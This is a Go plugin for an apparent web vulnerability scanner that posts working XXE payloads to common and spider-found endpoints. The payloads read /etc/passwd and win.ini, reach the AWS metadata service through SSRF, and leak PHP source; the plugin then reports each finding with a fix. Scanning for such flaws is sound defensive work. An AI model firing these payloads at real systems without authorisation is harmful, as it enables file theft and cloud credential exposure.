package plugins

import (
	"DORM/models"
	"fmt"
	"io"
	"strings"
)

// ==================================================
// XXE INJECTION — v2.0 "XML Devil"
// Çoklu endpoint · File Read · SSRF-via-XXE
// PHP wrapper · Spider entegrasyonu
// ==================================================
type XXEPlugin struct{}

func (p *XXEPlugin) Name() string { return "XXE Injection (XML Devil v2)" }

func (p *XXEPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := models.GetClient()
	baseURL := getURL(target, "")

	// ── Hedef endpoint'ler ──────────────────────────────────────────────
	xmlEndpoints := []string{
		"/xml", "/upload", "/api", "/api/xml", "/rest", "/rest/xml",
		"/soap", "/xmlrpc.php", "/xmlrpc", "/sitemap.xml",
		"/parse", "/convert", "/import", "/feed", "/rss",
	}

	// ── XML payload'ları ─────────────────────────────────────────────────
	type XXEPayload struct {
		Name    string
		XML     string
		Sig     string // response'da aranacak kanıt
		Desc    string
		Sev     string
		CVSS    float64
	}

	payloads := []XXEPayload{
		{
			Name: "XXE: Blind Entity Reflection",
			XML: `<?xml version="1.0" encoding="ISO-8859-1"?>` +
				`<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe "DORM_XXE_8x9k">]>` +
				`<foo>&xxe;</foo>`,
			Sig:  "DORM_XXE_8x9k",
			Desc: "XML entity yansıma testi — parser external entity'leri işliyor.",
			Sev:  "MEDIUM",
			CVSS: 7.5,
		},
		{
			Name: "XXE: Local File Read (Linux /etc/passwd)",
			XML: `<?xml version="1.0" encoding="ISO-8859-1"?>` +
				`<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]>` +
				`<foo>&xxe;</foo>`,
			Sig:  "root:x:0:0",
			Desc: "XXE üzerinden /etc/passwd okunabildi — local file read doğrulandı.",
			Sev:  "CRITICAL",
			CVSS: 9.1,
		},
		{
			Name: "XXE: Local File Read (Windows win.ini)",
			XML: `<?xml version="1.0" encoding="ISO-8859-1"?>` +
				`<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>` +
				`<foo>&xxe;</foo>`,
			Sig:  "[fonts]",
			Desc: "XXE üzerinden C:\\Windows\\win.ini okunabildi — Windows local file read doğrulandı.",
			Sev:  "CRITICAL",
			CVSS: 9.1,
		},
		{
			Name: "XXE: SSRF via XML External Entity",
			XML: `<?xml version="1.0" encoding="ISO-8859-1"?>` +
				`<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>` +
				`<foo>&xxe;</foo>`,
			Sig:  "ami-id",
			Desc: "XXE üzerinden AWS metadata endpoint'ine SSRF gerçekleşti — iç ağ erişimi doğrulandı.",
			Sev:  "HIGH",
			CVSS: 8.8,
		},
		{
			Name: "XXE: PHP Source Code Disclosure",
			XML: `<?xml version="1.0" encoding="ISO-8859-1"?>` +
				`<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>` +
				`<foo>&xxe;</foo>`,
			Sig:  "PD9waHA", // base64 encoded "<?php" başlangıcı
			Desc: "php://filter wrapper üzerinden PHP kaynak kodu base64 olarak sızdırıldı.",
			Sev:  "HIGH",
			CVSS: 8.2,
		},
	}

	// ── Content-Type varyantları ─────────────────────────────────────────
	contentTypes := []string{
		"application/xml",
		"text/xml",
		"application/soap+xml",
	}

	// ── Sabit endpoint'leri tara ─────────────────────────────────────────
	for _, ep := range xmlEndpoints {
		targetURL := baseURL + ep
		for _, pl := range payloads {
			for _, ct := range contentTypes {
				resp, err := client.Post(targetURL, ct, strings.NewReader(pl.XML))
				if err != nil {
					continue
				}
				bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 131072))
				resp.Body.Close()
				body := string(bodyBytes)

				if strings.Contains(body, pl.Sig) {
					return &models.Vulnerability{
						Target:   target,
						Name:     pl.Name,
						Severity: pl.Sev,
						CVSS:     pl.CVSS,
						Description: fmt.Sprintf(
							"%s\nEndpoint: %s\nContent-Type: %s\nKanıt: '%s' response'da bulundu.",
							pl.Desc, targetURL, ct, pl.Sig,
						),
						Solution:  "XML parser'ında external entity işlemeyi devre dışı bırakın (FEATURE_SECURE_PROCESSING). Kullanıcıdan gelen XML girdilerini sterilize edin.",
						Reference: "OWASP A05:2021 – Security Misconfiguration / XXE (CWE-611)",
					}
				}
			}
		}
	}

	// ── Spider endpoint entegrasyonu ─────────────────────────────────────
	key := "endpoints_" + target.IP
	if existing, ok := models.SharedData.Load(key); ok {
		spiderEndpoints := existing.([]models.Endpoint)
		for _, ep := range spiderEndpoints {
			if ep.Method != "POST" && ep.Method != "GET" {
				continue
			}
			for _, pl := range payloads {
				for _, ct := range contentTypes {
					resp, err := client.Post(ep.URL, ct, strings.NewReader(pl.XML))
					if err != nil {
						continue
					}
					bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 131072))
					resp.Body.Close()
					body := string(bodyBytes)

					if strings.Contains(body, pl.Sig) {
						return &models.Vulnerability{
							Target:   target,
							Name:     pl.Name + " (Spider-Discovered)",
							Severity: pl.Sev,
							CVSS:     pl.CVSS,
							Description: fmt.Sprintf(
								"%s\nSpider'ın keşfettiği endpoint: %s\nContent-Type: %s\nKanıt: '%s' bulundu.",
								pl.Desc, ep.URL, ct, pl.Sig,
							),
							Solution:  "XML parser'ında external entity işlemeyi devre dışı bırakın.",
							Reference: "OWASP XXE (CWE-611)",
						}
					}
				}
			}
		}
	}

	return nil
}
